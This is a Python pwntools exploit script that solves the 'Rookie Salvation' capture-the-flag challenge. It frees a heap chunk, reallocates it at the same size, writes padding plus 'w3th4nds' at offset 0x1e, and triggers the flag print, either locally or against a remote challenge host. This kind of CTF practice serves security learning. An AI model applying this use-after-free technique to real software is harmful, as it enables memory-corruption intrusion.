#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./rookie_salvation')
context.log_level = 'info'

def exploit(target):
    """
    Exploit strategy for Rookie Salvation:
    1. Use obliterate() to free the allocated_space chunk
    2. Use reserve_space() to reallocate the same chunk with size 0x26
    3. Write payload with "w3th4nds" at offset 0x1e (30 bytes)
    4. Call road_to_salvation() to trigger flag print
    
    This is a Use-After-Free (UAF) exploitation combined with heap reuse.
    """
    p = target
    
    # Wait for menu
    p.recvuntil(b'>')
    
    # Step 1: Free the allocated_space chunk using obliterate
    log.info("Step 1: Freeing allocated_space chunk")
    p.sendline(b'2')  # obliterate
    p.recvuntil(b'>')
    
    # Step 2: Reallocate the chunk with reserve_space
    log.info("Step 2: Reallocating chunk with size 0x26 (38 bytes)")
    p.sendline(b'1')  # reserve_space
    
    # Wait for size prompt (the actual prompt has Unicode, just wait for colon)
    p.recvuntil(b': ')
    
    # Allocate 38 bytes (0x26) - same size as original chunk
    size = 38
    p.sendline(str(size).encode())
    
    # Wait for message prompt
    p.recvuntil(b': ')
    
    # Step 3: Write payload with "w3th4nds" at offset 0x1e (30 bytes)
    log.info("Step 3: Writing payload with target string at offset 0x1e")
    payload = b'A' * 30  # Padding to reach offset 0x1e
    payload += b'w3th4nds'  # Target string at correct offset
    p.sendline(payload)
    
    # Step 4: Call road_to_salvation to get the flag
    log.info("Step 4: Calling road_to_salvation to trigger flag")
    p.recvuntil(b'>')
    p.sendline(b'3')  # road_to_salvation
    
    # Get the flag
    response = p.recvall(timeout=2)
    log.success(f"Response: {response.decode()}")
    
    # Look for flag pattern
    if b'HTB{' in response:
        flag_start = response.find(b'HTB{')
        flag_end = response.find(b'}', flag_start) + 1
        flag = response[flag_start:flag_end].decode()
        log.success(f"FLAG: {flag}")
    
    p.close()

if __name__ == '__main__':
    if args.REMOTE:
        target = remote('46.101.163.234', 31649)
    else:
        target = process('./rookie_salvation')
    
    exploit(target)
